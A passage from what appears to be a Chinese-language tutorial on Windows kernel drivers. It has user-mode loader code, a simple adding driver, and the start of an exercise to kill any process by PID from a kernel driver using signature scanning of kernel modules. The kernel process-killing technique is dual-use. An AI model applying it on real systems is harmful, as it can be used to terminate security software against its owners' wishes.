<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_IO_PENDING &amp;&amp; dwErr != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 驱动服务已经创建，打开服务</span></span><br><span class="line">	hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (!StartService(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunMathDriver</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建设备失败. %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 加法</span></span><br><span class="line">	DWORD n1 = <span class="number">100</span>, n2 = <span class="number">50</span>;</span><br><span class="line">	BYTE InBuffer[<span class="number">8</span>];</span><br><span class="line">	DWORD OutBuffer;</span><br><span class="line">	<span class="built_in">memcpy</span>(InBuffer,&amp;n1,<span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(InBuffer+<span class="number">4</span>,&amp;n2,<span class="number">4</span>);</span><br><span class="line">	DWORD dwOut;	</span><br><span class="line">	DeviceIoControl(hDevice,OPERADD,InBuffer,<span class="number">8</span>,&amp;OutBuffer,<span class="number">4</span>,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d\n&quot;</span>, n1, n2, OutBuffer);</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnLoadDriver</span><span class="params">(PCWSTR lpszDriverName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SC_HANDLE hServiceMgr = OpenSCManagerW(<span class="number">0</span>,<span class="number">0</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	SC_HANDLE hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	SERVICE_STATUS SvrStatus;</span><br><span class="line">	ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrStatus);</span><br><span class="line">	DeleteService(hServiceDDK);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!LoadDriver(DRIVER_NAME, DRIVER_PATH))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;加载驱动失败.\n&quot;</span>);</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	RunMathDriver();</span><br><span class="line">	UnLoadDriver(DRIVER_NAME);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0环驱动程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个简单的驱动，在驱动入口和卸载函数打印一些提示信息</span></span><br><span class="line"><span class="comment">// 这个驱动可以做加法，3环程序可以给他传两个4字节整数，驱动会返回相加的结果</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\MathsDriverDev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\??\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	ULONG uIndex = <span class="number">0</span>;</span><br><span class="line">	PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>; <span class="comment">// 设备对象指针</span></span><br><span class="line">	UNICODE_STRING DeviceName; <span class="comment">// 设备名，0环用</span></span><br><span class="line">	UNICODE_STRING SymbolicLinkName; <span class="comment">// 符号链接名，3环用</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建设备名称</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName,DEVICE_NAME);</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	status = IoCreateDevice(pDriver,<span class="number">0</span>,&amp;DeviceName,FILE_DEVICE_UNKNOWN,FILE_DEVICE_SECURE_OPEN,FALSE,&amp;pDeviceObj);</span><br><span class="line">	<span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(pDeviceObj);</span><br><span class="line">		DbgPrint(<span class="string">&quot;创建设备失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	DbgPrint(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置交互数据的方式</span></span><br><span class="line">	pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);</span><br><span class="line">	<span class="comment">// 设置分发函数</span></span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;</span><br><span class="line">	pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;</span><br><span class="line">	<span class="comment">// 设置卸载函数</span></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载驱动</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	UNICODE_STRING SymbolicLinkName;</span><br><span class="line">	<span class="comment">// 删除符号链接，删除设备</span></span><br><span class="line">	RtlInitUnicodeString(&amp;SymbolicLinkName, DRIVER_LINK);</span><br><span class="line">	IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">	IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载成功\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不设置这个函数，则Ring3调用CreateFile会返回1</span></span><br><span class="line"><span class="comment">// IRP_MJ_CREATE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_CLOSE 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;应用层断开连接设备.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IRP_MJ_DEVICE_CONTROL 处理函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// DbgPrint(&quot;IrpDeviceControlProc.\n&quot;);</span></span><br><span class="line">	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	ULONG uIoControlCode;</span><br><span class="line">	PVOID pIoBuffer;</span><br><span class="line">	ULONG uInLength;</span><br><span class="line">	ULONG uOutLength;</span><br><span class="line">	ULONG uRead1;</span><br><span class="line">	ULONG uRead2;</span><br><span class="line">	ULONG uWrite;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置临时变量的值</span></span><br><span class="line">	uRead1 = uRead2 = <span class="number">0</span>;</span><br><span class="line">	uWrite = <span class="number">0x12345678</span>;</span><br><span class="line">	<span class="comment">// 获取IRP数据</span></span><br><span class="line">	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">	<span class="comment">// 获取控制码</span></span><br><span class="line">	uIoControlCode = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	<span class="comment">// 获取缓冲区地址（输入输出是同一个）</span></span><br><span class="line">	pIoBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">// Ring3 发送数据的长度</span></span><br><span class="line">	uInLength = pIrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	<span class="comment">// Ring0 发送数据的长度</span></span><br><span class="line">	uOutLength = pIrpStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> OPERADD:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 读取缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead1,pIoBuffer,<span class="number">4</span>);</span><br><span class="line">			<span class="built_in">memcpy</span>(&amp;uRead2,(PUCHAR)pIoBuffer+<span class="number">4</span>,<span class="number">4</span>);			</span><br><span class="line">			uWrite = uRead1 + uRead2;</span><br><span class="line">			<span class="comment">// 写入缓冲区</span></span><br><span class="line">			<span class="built_in">memcpy</span>(pIoBuffer, &amp;uWrite, <span class="number">4</span>);</span><br><span class="line">			<span class="comment">// 设置状态</span></span><br><span class="line">			pIrp-&gt;IoStatus.Information = <span class="number">4</span>;</span><br><span class="line">			status = STATUS_SUCCESS;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回状态如果不设置，Ring3返回值是失败</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1-9-练习：结束指定PID进程"><a href="#1-9-练习：结束指定PID进程" class="headerlink" title="1.9 练习：结束指定PID进程"></a>1.9 练习：结束指定PID进程</h3><p>编写一个3环程序，可以将任意一个进程的PID传递给0环的驱动程序，如果这个进程存在，驱动程序将该进程终结。另外，如果工具可以以一个单文件的形式存在，即不带sys文件，那么看起来会高级不少，然而我现在无法完成该需求，如果你知道怎么做，请在评论中留言，我会转达<a href="https://blog.csdn.net/Kwansy">hambaga</a>。</p>
<p>这个项目基于1.8的练习，3环部分，只需将传递两个4字节加数改成传递一个4字节PID，并且修改一下宏定义中，驱动项目的名字即可。</p>
<p>3环代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span>	<span class="comment">//system(&quot;Pause&quot;);</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_NAME <span class="meta-string">L&quot;MathsDriver&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_PATH <span class="meta-string">L&quot;KillProc.sys&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\\\.\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDriver</span><span class="params">(PCWSTR lpszDriverName, PCWSTR lpszDriverPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 获取驱动完整路径</span></span><br><span class="line">	WCHAR szDriverFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	GetFullPathNameW(lpszDriverPath,MAX_PATH,szDriverFullPath,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%ws\n&quot;</span>, szDriverFullPath);</span><br><span class="line">	<span class="comment">// 打开服务控制管理器</span></span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>; <span class="comment">// SCM管理器句柄	</span></span><br><span class="line">	hServiceMgr = OpenSCManagerW(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenSCManagerW 失败, %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;打开服务控制管理器成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 创建驱动服务</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>; <span class="comment">// NT驱动程序服务句柄</span></span><br><span class="line">	hServiceDDK = CreateServiceW(</span><br><span class="line">		hServiceMgr,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		SERVICE_ALL_ACCESS,</span><br><span class="line">		SERVICE_KERNEL_DRIVER,</span><br><span class="line">		SERVICE_DEMAND_START,</span><br><span class="line">		SERVICE_ERROR_IGNORE,</span><br><span class="line">		szDriverFullPath,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_IO_PENDING &amp;&amp; dwErr != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 驱动服务已经创建，打开服务</span></span><br><span class="line">	hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (!StartServiceW(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunMathDriver</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建设备失败. %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建设备成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 输入要干掉的进程PID</span></span><br><span class="line">	DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要干掉的进程PID:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;dwPID);</span><br><span class="line">	DWORD dwInBuffer;</span><br><span class="line">	DWORD OutBuffer;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwInBuffer,&amp;dwPID,<span class="number">4</span>);</span><br><span class="line">	DWORD dwOut;	</span><br><span class="line">	DeviceIoControl(hDevice,OPERADD,&amp;dwInBuffer,<span class="number">4</span>,&amp;OutBuffer,<span class="number">4</span>,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">switch</span>(OutBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程关闭成功.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;进程关闭失败.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnLoadDriver</span><span class="params">(PCWSTR lpszDriverName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SC_HANDLE hServiceMgr = OpenSCManagerW(<span class="number">0</span>,<span class="number">0</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	SC_HANDLE hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	SERVICE_STATUS SvrStatus;</span><br><span class="line">	ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrStatus);</span><br><span class="line">	DeleteService(hServiceDDK);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!LoadDriver(DRIVER_NAME, DRIVER_PATH))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;加载驱动失败.\n&quot;</span>);</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	RunMathDriver();</span><br><span class="line">	UnLoadDriver(DRIVER_NAME);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>0环驱动代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEVICE_NAME <span class="meta-string">L&quot;\\Device\\MathsDriverDev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVER_LINK <span class="meta-string">L&quot;\\??\\MathsDriverLnk&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPERADD CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span>;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">KillProc</span><span class="params">(PDRIVER_OBJECT driver,ULONG uPID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegPath)</span></span>;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCreateProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpCloseProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">IrpDeviceControlProc</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span>;</span><br><span class="line">PDRIVER_OBJECT g_pDriver = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;<span class="comment">//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中,双链表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;<span class="comment">//系统已经启动,没有被初始化,没有调用DriverEntry这个历程的时候,通过这个链表进程串接起来</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">//已经调用DriverEntry这个函数的所有驱动程序</span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry</span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span 